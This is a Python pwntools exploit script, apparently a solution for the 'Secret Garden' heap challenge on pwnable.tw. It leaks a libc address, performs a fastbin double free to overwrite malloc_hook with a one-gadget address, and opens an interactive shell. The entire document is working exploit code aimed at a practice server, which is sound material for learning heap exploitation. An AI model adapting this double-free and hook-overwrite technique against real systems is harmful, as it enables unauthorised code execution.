#/usr/bin/envpython
from pwn import *

addr = "chall.pwnable.tw"
port = 10203

s = remote(addr, port)

def Menu():
    sleep(0.3)
    print s.recvuntil("  1 . Raise a flower")
    print s.recvuntil("  2 . Visit the garden")
    print s.recvuntil("  3 . Remove a flower from the garden")
    print s.recvuntil("  4 . Clean the garden")
    print s.recvuntil("  5 . Leave the garden")
    print s.recvuntil("Your choice : ")

def Raise(_len, _name, _color):
    Menu()
    s.sendline("1")

    sleep(0.3)
    print s.recvuntil("Length of the name :")
    s.sendline(_len)

    sleep(0.3)
    print s.recvuntil("The name of flower :")
    s.send(_name)

    sleep(0.3)
    print s.recvuntil("The color of the flower :")
    s.sendline(_color)

def Leak():
    Menu()
    s.sendline("2")

    sleep(0.3)
    print s.recvuntil("A"*8)
    main_arena = u64(s.recv(6)+"\x00\x00")
    return main_arena
    
def Remove(_index):
    Menu()
    s.sendline("3")

    sleep(0.3)
    print s.recvuntil("Which flower do you want to remove from the garden:")
    s.sendline(_index)


Raise("40", "fast_bin", "0")
Raise("128", "unsorted bin", "1")
Raise("128", "unsorted_bin", "2")

Remove("0")
Remove("1")

Raise("128", "A"*8, "3")

main_arena = Leak()
malloc_hook = main_arena - 0x68
malloc_hook_chunk = malloc_hook - 0x23
system_libc = main_arena - 0x37e7e8
one_shot = system_libc - 0x17a
one_shot2 = system_libc - 0x126
one_shot3 = system_libc + 0xaa334
one_shot4 = system_libc + 0xab1d7

log.info("main_arena : %x" % main_arena)
log.info("system_libc : %x" % system_libc)
log.info("one_shot : %x" % one_shot)
log.info("malloc_hook : %x" % malloc_hook)

Raise("96", "fast_bin", "4")
Raise("96", "fast_bin", "5")

Remove("4")
Remove("5")
Remove("4")

Raise("96", p64(malloc_hook_chunk), "for_overwrite")

Raise("96", "fast_bin", "7")
Raise("96", "fast_bin", "8")


Raise("96", "A"*19+p64(one_shot3), "overwrite")

Remove("4")
Remove("4") #malloc_printerr

s.interactive()
s.close()
